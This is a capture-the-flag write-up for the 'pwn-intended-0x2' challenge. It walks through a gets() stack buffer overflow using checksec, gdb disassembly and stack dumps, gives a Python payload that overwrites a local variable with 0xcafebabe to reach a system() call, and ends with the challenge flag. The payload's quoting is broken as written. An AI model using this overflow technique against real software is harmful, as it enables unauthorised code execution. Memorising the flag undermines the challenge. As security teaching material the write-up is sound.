# pwn-intended-0x2
## Info 

```
$ file pwn-intended-0x2
pwn-intended-0x2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter
 /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3fe5fe06984f7093c9122fb1b08fb834a63784d4, 
 for GNU/Linux 3.2.0, not stripped
 
$checksec pwn-intended-0x2
[*] pwn-intended-0x2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
```
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000000000401156 <+0>:	push   rbp
   0x0000000000401157 <+1>:	mov    rbp,rsp
   0x000000000040115a <+4>:	sub    rsp,0x30
   0x000000000040115e <+8>:	mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000401165 <+15>:	mov    rax,QWORD PTR [rip+0x2ef4]        # 0x404060 <stdout@@GLIBC_2.2.5>
   0x000000000040116c <+22>:	mov    esi,0x0
   0x0000000000401171 <+27>:	mov    rdi,rax
   0x0000000000401174 <+30>:	call   0x401040 <setbuf@plt>
   0x0000000000401179 <+35>:	mov    rax,QWORD PTR [rip+0x2ef0]        # 0x404070 <stdin@@GLIBC_2.2.5>
   0x0000000000401180 <+42>:	mov    esi,0x0
   0x0000000000401185 <+47>:	mov    rdi,rax
   0x0000000000401188 <+50>:	call   0x401040 <setbuf@plt>
   0x000000000040118d <+55>:	mov    rax,QWORD PTR [rip+0x2eec]        # 0x404080 <stderr@@GLIBC_2.2.5>
   0x0000000000401194 <+62>:	mov    esi,0x0
   0x0000000000401199 <+67>:	mov    rdi,rax
   0x000000000040119c <+70>:	call   0x401040 <setbuf@plt>
   0x00000000004011a1 <+75>:	lea    rdi,[rip+0xe60]        # 0x402008
   0x00000000004011a8 <+82>:	call   0x401030 <puts@plt>
   0x00000000004011ad <+87>:	lea    rax,[rbp-0x30]
   0x00000000004011b1 <+91>:	mov    rdi,rax
   0x00000000004011b4 <+94>:	mov    eax,0x0
   0x00000000004011b9 <+99>:	call   0x401060 <gets@plt>
   0x00000000004011be <+104>:	lea    rdi,[rip+0xe6c]        # 0x402031
   0x00000000004011c5 <+111>:	call   0x401030 <puts@plt>
   0x00000000004011ca <+116>:	cmp    DWORD PTR [rbp-0x4],0xcafebabe
   0x00000000004011d1 <+123>:	jne    0x4011f0 <main+154>
   0x00000000004011d3 <+125>:	lea    rdi,[rip+0xe66]        # 0x402040
   0x00000000004011da <+132>:	call   0x401030 <puts@plt>
   0x00000000004011df <+137>:	lea    rdi,[rip+0xe8a]        # 0x402070
   0x00000000004011e6 <+144>:	mov    eax,0x0
   0x00000000004011eb <+149>:	call   0x401050 <system@plt>
   0x00000000004011f0 <+154>:	mov    eax,0x0
   0x00000000004011f5 <+159>:	leave  
   0x00000000004011f6 <+160>:	ret    
End of assembler dump.
```
Here we have gets at <main+99> function which is vulnearable to function .
by using this function we overwrite bytes of data 

We can see that. there is a comparison at <main+116> so we are going to  use
this vulnearbility overwite the varible data which is comparing to 0xcafebabe
so we can easily bypass the check.

```
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7af4264 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7dd18c0 --> 0x0 
RSI: 0x7ffff7dd07e3 --> 0xdd18c0000000000a 
RDI: 0x1 
RBP: 0x7fffffffdf10 ("MMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
RSP: 0x7fffffffdee0 ("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
RIP: 0x4011f5 (<main+159>:	leave)
R8 : 0xd ('\r')
R9 : 0x7ffff7fe14c0 (0x00007ffff7fe14c0)
R10: 0x3 
R11: 0x246 
R12: 0x401070 (<_start>:	endbr64)
R13: 0x7fffffffdff0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0xa97 (CARRY PARITY ADJUST zero SIGN trap INTERRUPT direction OVERFLOW)
[-------------------------------------code-------------------------------------]
   0x4011e6 <main+144>:	mov    eax,0x0
   0x4011eb <main+149>:	call   0x401050 <system@plt>
   0x4011f0 <main+154>:	mov    eax,0x0
=> 0x4011f5 <main+159>:	leave  
   0x4011f6 <main+160>:	ret    
   0x4011f7:	nop    WORD PTR [rax+rax*1+0x0]
   0x401200 <__libc_csu_init>:	endbr64 
   0x401204 <__libc_csu_init+4>:	push   r15
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdee0 ("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0008| 0x7fffffffdee8 ("CCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0016| 0x7fffffffdef0 ("EEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0024| 0x7fffffffdef8 ("GGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0032| 0x7fffffffdf00 ("IIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0040| 0x7fffffffdf08 ("KKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0048| 0x7fffffffdf10 ("MMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
0056| 0x7fffffffdf18 ("OOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x00000000004011f5 in main ()```

when i try to fill stack with values. i found it is 44 

so we can craft our exploit.

``` 
python -c 'print "A"*44 + '\xbe\xba\xfe\xca'' 
```
 
flag  csictf{c4n_y0u_re4lly_telep0rt?}








